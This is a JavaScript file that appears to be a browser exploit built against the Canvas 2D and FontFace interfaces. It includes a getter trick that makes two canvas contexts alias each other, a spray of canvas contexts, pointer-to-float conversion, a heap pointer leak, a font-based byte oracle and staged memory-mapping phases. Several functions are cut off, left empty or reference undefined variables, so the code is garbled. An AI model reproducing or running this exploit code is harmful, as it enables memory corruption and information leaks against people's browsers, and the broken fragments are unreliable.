function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }

function ptrToBiasedFloat(ptr){
  _u64[0] = 0x3FF0000000000000n | (BigInt(ptr) & 0x000FFFFFFFFFFFFFn);
  return _f64[0];
}

function biasedFloatToPtr(f){
  _f64[0] = Number(f);

function pad4(n){

}

function makeRange(lo, hi){
  if (lo === hi) return 'U+' + pad4(lo);
  return 'U+' + pad4(lo) + '-' + pad4(hi);
}

/* ---- Step 1: Baseline Leak ---- */

function extractPtrs(v){
  var LO = BigInt('0x1000000000'), HI = BigInt('0x80000000000');
  P58 = null; P68 = null;
  if (v[11] >= LO && v[11] < HI) P58 = v[11];
  if (v[13] >= LO && v[13] < HI) P68 = v[13];
  if (!P58 || !P68){
    for (var q = 0; q < 24; q++){
      var val = v[q];
      if (val >= LO && val < HI){
        if (!P58) P58 = val;
        else if (!P68 && val !== P58) P68 = val;
      }
    }
  }
  if (!P68) P68 = 0n;
}

/* Factory helper for dedicated isolated oracles */
function createOracle(nameTag){
  var face = new FontFace(nameTag, 'url(/hang.php?nocache=' + Date.now() + '_' + nameTag + ')', { unicodeRange: 'U+0000-00FF' });
  document.fonts.add(face);
  face.load().catch(function(){});
  return face;
}

function resolveByteWithOracle(oracle, fontName, targetByte){
  var low = 0x00, high = 0xFF;
  var steps = 0;
  while (low < high && steps < 10){
    steps++;
    var mid = Math.floor((low + high) / 2);
    oracle.unicodeRange = makeRange(low, mid);
    var chk = document.fonts.check('1em ' + fontName, String.fromCharCode(targetByte));
    var isLower = (chk === false);
    if (isLower) high = mid;
    else low = mid + 1;
  }
  return low;
}

function decode64WithOracle(oracle, fontName, ptrVal){
  if (!ptrVal && ptrVal !== 0n) return 0n;
  var raw = [];
  var tmp = BigInt(ptrVal);
  for (var i = 0; i < 8; i++){
    raw.push(Number(tmp & 0xFFn));
    tmp = tmp >> 8n;
  }
  var res = 0n;
  for (var j = 0; j < 8; j++){
    var bDec = resolveByteWithOracle(oracle, fontName, raw[j]);
    res |= (BigInt(bDec) << (BigInt(j) * 8n));
  }
  return res;
}

/* ---- Phase A: 4-Slab Wide-Span Memory Mapping (768 Bytes / 96 Words) ---- */
function phaseA_fourSlabTraversal(cb){

/* ---- Phase B: Unified State Bank 32-Cycle Bi-Directional Ping-Pong ---- */
function phaseB_scalarMatrixPingPong(cb){
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);

    var inner = null, outer = null;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function(){
        inner = canvas.getContext('2d');
        inner.lineWidth = 1337.5;
        inner.save();
        return false;
      },
      enumerable: true
    });

    outer = canvas.getContext('2d', opts);

    if (!inner || !outer || inner === outer){
      b('B-CANVAS-FAIL', 'inner=' + !!inner + '|outer=' + !!outer);
      setTimeout(cb, 50);
      return;
    }

    var sprayCtx = [];
    for (var i = 0; i < 80; i++){
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      var ctx = c.getContext('2d');
      if (ctx){
        ctx.lineWidth = 4000 + i;
        sprayCtx.push(ctx);
      }
    }

    inner.lineWidth = 71337.5;
    var aliasIdx = -1;
    for (var j = 0; j < sprayCtx.length; j++){
      if (Math.abs(sprayCtx[j].lineWidth - 71337.5) < 0.01){
        aliasIdx = j;
        break;
      }
    }

    if (aliasIdx < 0){
      b('B-ALIAS-MISS', 'lineWidth-scan-failed');
      setTimeout(cb, 50);
      return;
    }

    var alias = sprayCtx[aliasIdx];
    var pingPongOk = true;

    // 32 bi-directional ping-pong cycles over transform + scalar registers
    for (var cyc = 0; cyc < 32; cyc++){
      var valA = 0x1000000000n | (BigInt(cyc) << 16n) | 0xCC01n;
      var valB = 0x1000000000n | (BigInt(cyc) << 16n) | 0xDD02n;
      var scalarVal = 100.0 + cyc * 2.5;

      if (cyc % 2 === 0){
        // Alias -> Inner
        alias.setTransform(ptrToBiasedFloat(valA), ptrToBiasedFloat(valB), 1, 1, 0, 0);
        alias.lineWidth = scalarVal;
        var t = inner.getTransform();
        if (biasedFloatToPtr(t.a) !== (valA & 0x000FFFFFFFFFFFFFn) ||
            biasedFloatToPtr(t.b) !== (valB & 0x000FFFFFFFFFFFFFn) ||
            Math.abs(inner.lineWidth - scalarVal) > 0.01){
          pingPongOk = false;
          break;
        }
      } else {
        // Inner -> Alias
        inner.setTransform(ptrToBiasedFloat(valB), ptrToBiasedFloat(valA), 1, 1, 0, 0);
        inner.lineWidth = scalarVal;
        var t2 = alias.getTransform();
        if (biasedFloatToPtr(t2.a) !== (valB & 0x000FFFFFFFFFFFFFn) ||
            biasedFloatToPtr(t2.b) !== (valA & 0x000FFFFFFFFFFFFFn) ||
            Math.abs(alias.lineWidth - scalarVal) > 0.01){
          pingPongOk = false;
          break;
        }
      }
    }

    var rep = 'aliasIdx=' + aliasIdx + '|pingPongOk=' + pingPongOk + '|cycles=32';
    b('B-PINGPONG-OK', rep);
    log('Phase B Ping-Pong: ' + rep);
  } catch(e){
    b('B-PINGPONG-ERR', e.message);
    log('Phase B Error: ' + e.message);
  }

  setTimeout(cb, 50);
}

/* ---- Phase D: 4096-Byte (4-Kilobyte / 32,768-Bit / 1-Page) Master Memory Matrix ---- */
function phaseD_oracle4096ByteBlock(cb){
  try {
    var oracleD = createOracle('actFamBlock4096');

    var chunk16Base = Q11_RECLAIM & ~0x3FFFn;
    var estSelfAddr = chunk16Base + (BigInt(BEST_K) * 192n);

    /* Construct 512 full 64-bit words (Total 4096 Bytes = 32,768 Bits = 1 Full 4KB OS Page) */
    var block512 = [];

    // Words 0..7: Hardware pointers & slab geometry
    block512.push(P58);
    block512.push(P68);
    block512.push(Q11_RECLAIM);
    block512.push(Q12_RECLAIM);
    block512.push(Q13_RECLAIM);
    block512.push(chunk16Base);
    block512.push(estSelfAddr);
    block512.push(0x0000001000001337n);

    // Words 8..15: Canonical bit patterns
    block512.push(0x0123456789ABCDEFn);
    block512.push(0xFEDCBA9876543210n);
    block512.push(0x5555555555555555n);
    block512.push(0xAAAAAAAAAAAAAAAAn);
    block512.push(0xFF00FF00FF00FF00n);
    block512.push(0x00FF00FF00FF00FFn);
    block512.push(0x00000000FFFFFFFFn);
    block512.push(0xFFFFFFFF00000000n);

      block512.push(chunk16Base | (BigInt(i) * 192n));

    // Words 112..207: Object Descriptor Table (96 words)
    for (var i = 0; i < 96; i++){
      block512.push(0x2000000000n | (BigInt(i) << 16n) | 0xCA00n);
    }

    // Words 208..303: State Bank Image & Biased Mantissas (96 words)
    for (var i = 0; i < 96; i++){

    for (var i = 0; i < 48; i++){

    b('D-4096B-ORACLE-MATRIX', rep);
